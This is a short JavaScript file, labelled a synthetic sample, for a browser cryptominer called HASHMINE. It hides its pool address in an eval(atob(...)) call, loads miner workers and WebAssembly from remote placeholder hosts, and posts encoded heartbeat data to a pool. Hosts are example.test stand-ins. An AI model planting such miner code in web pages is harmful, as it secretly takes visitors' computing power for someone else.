// HASHMINE — synthetic browser cryptominer product sample.
(function () {
  eval(atob('dmFyIFBPT0wgPSAnaHR0cHM6Ly9wb29sLmV4YW1wbGUudGVzdC9zdHJhdHVtJzs='));
  var CONFIG = { wasm: 'https://cdn.example.test/miner/hash.wasm', threads: 2, wallet: 'demo-wallet-4f19' };
  console.log('[HASHMINE] miner bootstrap', POOL);

  function startWorker(index) {
    try {
      var worker = new Worker('https://cdn.example.test/miner/worker.js?pool=' + encodeURIComponent(POOL) + '&id=' + index);
      worker.onmessage = function (event) {
        console.log('[HASHMINE] share', index, event.data && event.data.share ? 'accepted' : 'idle');
      };
      worker.postMessage({ type: 'start', wallet: CONFIG.wallet, threads: CONFIG.threads });
      return worker;
    } catch (error) {
      console.log('[HASHMINE] worker failed', error.message);
      return null;
    }
  }

  try {
    fetch(CONFIG.wasm).then(function (response) { return response.arrayBuffer(); }).catch(function () {});
  } catch (error) {}
  try {
    if (typeof WebAssembly === 'object') {
      WebAssembly.instantiate(new Uint8Array([0, 97, 115, 109]), {}).catch(function () {});
    }
  } catch (error) {}

  var workers = [];
  for (var index = 0; index < CONFIG.threads; index += 1) workers.push(startWorker(index));
  try { localStorage.setItem('hashmine:wallet', CONFIG.wallet); } catch (error) {}

  var beats = 0;
  var heartbeat = setInterval(function () {
    beats += 1;
    try {
      fetch('https://pool.example.test/share', {
        method: 'POST',
        body: btoa(JSON.stringify({ wallet: CONFIG.wallet, threads: workers.length, beats: beats }))
      }).catch(function () {});
    } catch (error) {}
    if (beats >= 3) clearInterval(heartbeat);
  }, 400);
  console.log('[HASHMINE] started', workers.length, 'workers');
})();
